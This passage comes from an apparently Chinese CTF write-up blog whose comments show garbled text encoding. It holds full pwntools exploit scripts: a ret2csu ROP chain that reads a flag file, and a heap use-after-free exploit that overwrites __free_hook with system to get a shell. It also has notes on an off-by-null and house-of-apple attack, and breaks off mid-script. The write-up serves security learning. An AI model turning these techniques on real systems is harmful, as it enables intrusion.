class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400788</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400961</span></span><br><span class="line">ret = <span class="number">0x0000000000400696</span></span><br><span class="line">leave_ret = <span class="number">0x0000000004008FC</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040095d</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt.read</span><br><span class="line">read_got = elf.got.read</span><br><span class="line"></span><br><span class="line">csu_front = <span class="number">0x400940</span></span><br><span class="line">csu_end = <span class="number">0x40095A</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x0400878</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu:    0, 1, call, rdi, rsi, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:0000000000400940 4C 89 FA                      mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400943 4C 89 F6                      mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400946 44 89 EF                      mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400949</span></span><br><span class="line"><span class="string">.text:000000000040094D 48 83 C3 01                   add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400954 75 EA                         jnz     short loc_400940</span></span><br><span class="line"><span class="string">.text:0000000000400954</span></span><br><span class="line"><span class="string">.text:0000000000400956</span></span><br><span class="line"><span class="string">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34â†‘j</span></span><br><span class="line"><span class="string">.text:0000000000400956 48 83 C4 08                   add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040095A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040095B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040095C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040095E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400960 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400962 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400964 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">64</span> + <span class="number">8</span>)</span><br><span class="line">p1 += flat([</span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0x400</span>,</span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">])</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss ROP chain</span></span><br><span class="line"><span class="comment"># è°ƒç”¨bssæ®µçš„ä»£ç ï¼Œç„¶åæœ€å pop rbp ç»™rbpæŒ‡å®šä¸€ä¸ªå€¼ï¼Œå°±æ˜¯ stdout+0x3d</span></span><br><span class="line"><span class="comment"># è°ƒç”¨magic gadget ï¼Œ[stdout] å†…å®¹</span></span><br><span class="line"><span class="comment"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2xg &amp;stdout</span></span><br><span class="line"><span class="string">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; p syscall</span></span><br><span class="line"><span class="string">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d1b520 &lt;syscall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10wi 0x7fc4d7d1b520</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d100f0 &lt;write&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = flat([</span><br><span class="line">    stdout+<span class="number">0x3d</span>,                        <span class="comment"># rbp</span></span><br><span class="line">    csu_end, <span class="number">0x100000000</span>+<span class="number">0x7fc4d7d1b537</span>-<span class="number">0x00007fc4d7fec760</span>, stdout+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    magic,                                                      <span class="comment"># å°†stdout æ”¹æˆsyscall</span></span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x1</span>,                <span class="comment"># å‡½æ•°è¿”å›å€¼ä¸ºrax</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, stdout, <span class="number">1</span>, read_got, <span class="number">8</span>,                 <span class="comment"># syscall (1, 1, read_got, 8)ã€‚</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x100</span>,         <span class="comment"># è¯»å…¥ç¬¬äºŒä¸ªROPchian</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret                                                   <span class="comment"># è¿ç§»åˆ°ç¬¬äºŒä¸ªbss_chain</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">s(p2)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - libc.sym.read</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;bss&quot;</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = bss+<span class="number">0x1000</span></span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx; ret&quot;</span>)).__next__() </span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi; ret&quot;</span>)).__next__() </span><br><span class="line"></span><br><span class="line">rop_chian = flat([</span><br><span class="line">    <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>,  <span class="comment"># å¡«å……8å­—èŠ‚</span></span><br><span class="line">    pop_rdi_ret, flag_addr, pop_rsi_ret, <span class="number">0</span>, open_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, write_addr,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">s(rop_chian)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><p>coffee_list: å­˜å‚¨å’–å•¡ä¿¡æ¯ã€‚<br>ä¸¤ä¸ªcoffee_leftæ•°ç»„ï¼Œåˆ†åˆ«æ˜¯ user å’Œ adminï¼Œæ˜¯ä¸€ä¸ª <code>3*7</code> æ•°ç»„ï¼Œidå’Œposition</p><p>user</p><ul><li>è´­ä¹°ï¼Œè¾“å…¥idï¼ŒæŒ‰ç…§posé¡ºåºè¿›è¡Œfree</li><li>æŸ¥çœ‹ï¼Œæ‰“å°å‡º coffee_list ä¿¡æ¯</li></ul><p>admin</p><ul><li>replenishï¼šå…ˆæ›´æ–°admin coffee_listï¼Œç„¶åæ›´æ–° user coffee_left</li><li>change_defaultï¼Œè¾“å…¥idå’Œposæ›´æ–°å†…å®¹ï¼Œç„¶åæ›´æ–°user coffee_left</li></ul><p>å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼Œéƒ½å¯ä»¥è¿›è¡Œæ³„éœ²å’Œ get shell</p><ul><li>adminåœ¨ change_default ä½¿ï¼Œæ²¡æœ‰å…ˆè¿›è¡Œupdateï¼Œç›´æ¥readä¼šå¯¼è‡´uafé—®é¢˜</li><li>æ•°ç»„underflowï¼Œå› ä¸ºè¯»å…¥çš„id, pos æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å°äº0ã€‚</li></ul><p>expå¦‚ä¸‹</p><ul><li>ç”±äºchange_defaultå­˜åœ¨æ›´æ–°ï¼Œå®¹æ˜“å¯¼è‡´double free å’Œ æ— æ³•  replenish çš„é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸­é€”æ›´æ–°ä¸€ä¸‹admin coffee_leftã€‚ï¼ˆ<del>èœé¸¡çš„çœ¼æ³ª</del></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;pwn_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">idx, con = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input the id of what coffee you want to buy&quot;</span>, itob(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Do you want to add something?Y/N&quot;</span>, <span class="string">b&quot;Y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Ok,please input what you need in coffee&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    menu(<span class="number">0x1145</span>)</span><br><span class="line">    sa(<span class="string">b&quot;please input the admin password&quot;</span>, <span class="string">b&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_admin</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to replenish&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_default</span>(<span class="params"><span class="built_in">id</span>, pos, con</span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to change&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    sa(<span class="string">b&quot;input which coffee you want to change&quot;</span>, itob(pos))</span><br><span class="line">    sa(<span class="string">b&quot;input your content&quot;</span>, con)</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line">free_got = elf.got.free</span><br><span class="line">cofflist = <span class="number">0x4062F0</span></span><br><span class="line">stderr = <span class="number">0x4062e0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">4</span>, p64(cofflist))</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">2</span>, p64(stderr))</span><br><span class="line">show()</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1ed5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">4</span>, p64(libc.sym.__free_hook))</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">2</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>å‡ºé¢˜äººå¾ˆå¥½å¿ƒçš„ç»™å‡ºäº†ä¸€ä¸ªå †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å †åˆå¹¶æ—¶ï¼Œç»•è¿‡unlink_chunkçš„assert</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>é—®é¢˜å‡ºç°åœ¨ è¯»å–æ•°æ®ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºå†™0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">read_con</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬sizeçš„é™åˆ¶ï¼Œè¿™ä¸ªå¤§å°çš„binä¸º tcache, unsorted, large bin</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &gt; <span class="number">0x3FF</span> &amp;&amp; size &lt;= <span class="number">0x500</span></span><br></pre></td></tr></table></figure><p>æ³„éœ²å‡ºåœ°å€ï¼Œ<code>large bin attack</code>ï¼Œä½¿ç”¨house of apple æ‰‹æ®µã€‚</p><ul><li>a-b-cï¼Œåœ¨aä¼ªé€ ä¸€ä¸ªå †ï¼Œä½†æ˜¯å› ä¸ºä½¿ç”¨putså‡½æ•°è¿›è¡Œshowï¼Œä½†æ˜¯ä¼šå­˜åœ¨<code>\x00</code> æˆªæ–­é—®é¢˜ï¼Œå¯ä»¥å°†aä¼ªé€ æˆä¸€ä¸ª free_chunkï¼Œå¹¶ä¸”ä¼šå› ä¸ºarenaåœ°å€æ— æ³•leakæˆåŠŸã€‚å› æ­¤éœ€è¦å †é£æ°´ä¸€ä¸‹ï¼Œè®©large bin arenaæœ€åä¸€å­—èŠ‚ä¸ä¸º0ã€‚</li><li>free b, a-b åˆå¹¶ï¼Œmalloc d, a &amp; dæŒ‡å‘åŒä¸€ä¸ªchunkï¼Œå°±å¯ä»¥æœ‰ç±»ä¼¼uafçš„æ•ˆæœã€‚</li><li>large bin attack çš„æ‰‹æ®µï¼š free a, aæ”¾å…¥largebin é‡Œï¼Œåˆ©ç”¨dä¿®æ”¹açš„ <code>bk_nextsize</code> ä¸º  <code>io_list_all-0x20</code> ï¼Œé‡Šæ”¾ä¸€ä¸ªæ¯”<code>a</code> sizeå°çš„chunk <code>e</code>ï¼Œå°†<code>e</code>æ”¾å…¥large biné‡Œã€‚è¿™æ · <code>io_list_all =&gt; heap a</code></li><li>house_of_appleï¼šåˆ©ç”¨dä¿®æ”¹aå†…å®¹ï¼Œä¼ªé€ ä¸€ä¸ª<code>fake_io</code></li><li>é€€å‡ºï¼ŒIOæµï¼Œå¹¶ä¸”æ­¤é¢˜æ²¡æœ‰æ²™ç®±</li></ul><p>house of apple çš„expå¦‚ä¸‹</p><ul><li>ä½†æ˜¯è¿™æ˜¯åœ¨æˆ‘kaliçš„glibc 2.37 ä¸‹è¿›è¡Œçš„ï¼Œåœ¨libc2.38 patchåä¼šå› ä¸ºarenaæœ€åä¸€ä¸ªå­—èŠ‚ä¸º0è€Œæ— æ³•æˆåŠŸï¼ŒğŸ˜«ï¼Œä¸æƒ³é£æ°´äº†</li><li>æœ€åå‡‘ä¸€ä¸ª <code>rdi/flag</code> ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>): <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): 